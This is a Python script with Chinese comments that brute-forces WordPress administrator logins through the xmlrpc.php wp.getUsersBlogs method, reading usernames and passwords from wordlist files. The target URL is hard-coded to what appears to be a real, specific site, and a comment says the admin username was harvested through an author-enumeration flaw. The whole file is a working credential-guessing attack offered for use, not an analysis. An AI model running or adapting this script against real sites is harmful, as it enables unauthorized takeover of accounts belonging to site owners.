# codding:utf-8
'''
漏洞详情请查看：http://www.freebuf.com/articles/web/38861.html
'''
import re
import requests
def ReadMe():
    print ("""说明：
    1.在本文件同目录下新建usernames.txt、passwords.txt分别存入用户名、密码字典
    2.按提示输入WordPress站点(例如:www.freebuf.com)
    """)

def GetUrl():
    requrl="https://gzxy.me/xmlrpc.php"
    print ("尝试利用:"+requrl)
    return requrl



def Exploit():
    requrl=GetUrl()
    if True :
    #usernames.txt 文件中其实只有一个用户名，因为我们通过author漏洞获取到了管理的用户名。
        f_username=open("usernames.txt","r")
        f_password=open("passwords.txt","r")
        num=0
        Flag=0
        for name in f_username:
            if Flag == 1:
                break
            for key in f_password:
                if num % 10 == 0:
                    print ("已尝试"+str(num)+"个")
                if len(key)<1:
                    continue #wordpress管理员密码长度最短是8  所以这里小于8的跳过
                reqdata='<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs\
                        </methodName><params><param><value>'+ name + \
                        '</value></param><param><value>'+ key  +\
                        '</value></param></params></methodCall>'
                req = requests.post(url=requrl,data=reqdata)
                result = req.text
                print(req.text)
                num=num+1
                if "isAdmin" in result :
                    print ("Got it !")
                    print ("username :"+name+"password :"+key)
                    Flag = 1
                    break

                elif "faultString" and "403" in result :
                    continue

                else :
                    print ("Unknown error")
        print ("抱歉，在此字典中并未找到正确的密码")

if __name__ == '__main__' :
    ReadMe()
    Exploit()